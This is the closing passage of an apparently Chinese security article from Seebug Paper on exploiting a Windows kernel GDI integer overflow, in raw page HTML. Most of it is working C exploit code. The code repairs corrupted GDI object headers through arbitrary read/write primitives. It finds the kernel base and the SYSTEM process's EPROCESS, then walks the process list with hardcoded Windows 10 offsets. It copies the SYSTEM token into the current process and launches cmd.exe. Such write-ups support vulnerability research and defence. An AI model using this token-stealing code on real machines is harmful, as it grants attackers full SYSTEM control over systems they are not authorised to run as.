<span class="nt">u</span> <span class="o">=</span> <span class="nt">u</span> <span class="nt">-</span> <span class="nt">0x10</span><span class="o">;</span>
<span class="nt">addr1</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span> <span class="o">=</span> <span class="nt">u</span><span class="o">;</span>

<span class="o">//</span> <span class="nt">Fix</span> <span class="nt">overflown</span> <span class="nt">Gh04</span> <span class="nt">object</span> <span class="nt">Header</span>
<span class="nt">SetAddress</span><span class="o">(</span><span class="nt">addr1</span><span class="o">);</span>
<span class="nt">WriteToAddress</span><span class="o">(</span><span class="nt">Gh04</span><span class="o">,</span> <span class="nt">0x10</span><span class="o">);</span>
<span class="o">//</span> <span class="nt">Calculate</span> <span class="nt">address</span> <span class="nt">to</span> <span class="nt">overflown</span> <span class="nt">Gh05</span> <span class="nt">object</span> <span class="nt">header</span><span class="o">.</span>
<span class="nt">addr1</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span> <span class="o">=</span> <span class="nt">0xc0</span><span class="o">;</span>
<span class="nt">int</span> <span class="nt">y</span> <span class="o">=</span> <span class="nt">addr1</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="o">;</span>
<span class="nt">y</span> <span class="o">=</span> <span class="nt">y</span> <span class="o">+</span> <span class="nt">0xb</span><span class="o">;</span>
<span class="nt">addr1</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span> <span class="o">=</span> <span class="nt">y</span><span class="o">;</span>

<span class="o">//</span> <span class="nt">Fix</span> <span class="nt">overflown</span> <span class="nt">Gh05</span> <span class="nt">object</span> <span class="nt">Header</span>
<span class="nt">SetAddress</span><span class="o">(</span><span class="nt">addr1</span><span class="o">);</span>
<span class="nt">WriteToAddress</span><span class="o">(</span><span class="nt">Gh05</span><span class="o">,</span> <span class="nt">0x10</span><span class="o">);</span>
</pre></div>


<h6>3.3 替换 Token 实现提权</h6>
<p><code>ntoskrnl</code> 中的 <code>PsInitialSystemProcess</code> 存储了 <code>SYSTEM</code> 进程的 <code>EPROCESS</code> 地址，这里使用
 <code>EnumDeviceDrivers</code> 来获取 <code>ntoskrnl</code> 的基址，另外也可以通过 <code>NtQuerySystemInformation(11)</code> 来获取 <code>ntoskrnl</code> 的基址。</p>
<div class="codehilite"><pre><span></span>// Get base of ntoskrnl.exe
ULONG64 GetNTOsBase()
{
    ULONG64 Bases[0x1000];
    DWORD needed = 0;
    ULONG64 krnlbase = 0;
    if (EnumDeviceDrivers((LPVOID *)&amp;Bases, sizeof(Bases), &amp;needed)) {
        krnlbase = Bases[0];
    }
    return krnlbase;
}

// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
    // load ntoskrnl.exe
    ULONG64 ntos = (ULONG64)LoadLibrary(&quot;ntoskrnl.exe&quot;);
    // get address of exported PsInitialSystemProcess variable
    ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, &quot;PsInitialSystemProcess&quot;);
    FreeLibrary((HMODULE)ntos);
    ULONG64 res = 0;
    ULONG64 ntOsBase = GetNTOsBase();
    // subtract addr from ntos to get PsInitialSystemProcess offset from base
    if (ntOsBase) {
        ReadFromAddress(addr - ntos + ntOsBase, (BYTE *)&amp;res, sizeof(ULONG64));
    }
    return res;
}
</pre></div>


<p>获取到 <code>SYSTEM</code> 进程的 <code>EPROCESS</code> 地址后就可以读取其中的 <code>ActiveProcessLinks</code> 属性地址，它是一个存放所有进程 <code>EPROCESS</code> 地址的双向链表，通过遍历它来得到当前进程的 <code>EPROCESS</code> 地址。</p>
<div class="codehilite"><pre><span></span>typedef struct
{
    DWORD UniqueProcessIdOffset;
    DWORD TokenOffset;
} VersionSpecificConfig;

VersionSpecificConfig gConfig = { 0x2e8, 0x358 }; // Win 10

LONG64 PsGetCurrentProcess()
{
    ULONG64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS
     // walk ActiveProcessLinks until we find our Pid
    LIST_ENTRY ActiveProcessLinks;
    ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&amp;ActiveProcessLinks, sizeof(LIST_ENTRY));
    ULONG64 res = 0;
    while (TRUE) {
        ULONG64 UniqueProcessId = 0;
        // adjust EPROCESS pointer for next entry
        pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
        // get pid
        ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE *)&amp;UniqueProcessId, sizeof(ULONG64));
        // is this our pid?
        if (GetCurrentProcessId() == UniqueProcessId) {
            res = pEPROCESS;
            break;
        }
        // get next entry
        ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&amp;ActiveProcessLinks, sizeof(LIST_ENTRY));
        // if next same as last, we reached the end
        if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
            break;
    }
    return res;
}
</pre></div>


<p>最后把 <code>SYSTEM</code> 进程的 <code>Token</code> 替换到当前进程实现提权</p>
<div class="codehilite"><pre><span></span>// get System EPROCESS
ULONG64 SystemEPROCESS = PsInitialSystemProcess();
ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
ULONG64 SystemToken = 0;
// read token from system process
ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE *)&amp;SystemToken, 0x8);
// write token to current process
ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
SetAddress((BYTE *)&amp;CurProccessAddr);
WriteToAddress((BYTE *)&amp;SystemToken);
// Done and done. We&#39;re System :)
system(&quot;cmd.exe&quot;);
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/06/12-1.png-w331s" /></p>
<h4>4. 参考</h4>
<ul>
<li>
<p><a href="https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/">https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/</a></p>
</li>
<li>
<p><a href="https://github.com/sensepost/ms16-098">https://github.com/sensepost/ms16-098</a></p>
</li>
<li>
<p><a href="https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-using-gdi-objects">https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-using-gdi-objects</a></p>
</li>
<li>
<p><a href="https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives">https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives</a></p>
</li>
<li>
<p><a href="https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf</a></p>
</li>
<li>
<p><a href="https://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes">https://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes</a></p>
</li>
</ul>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/320/">https://paper.seebug.org/320/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/319/"><span aria-hidden="true">&larr;</span> 一款通过 SO 进行自保护的银行 APP 劫持木马深度...</a>
    
    
      <a class="older-posts" href="/321/">如何通过 SSH 隧道进行域渗透的 PtT 攻击 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=bird"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=bird">bird</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=bird">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
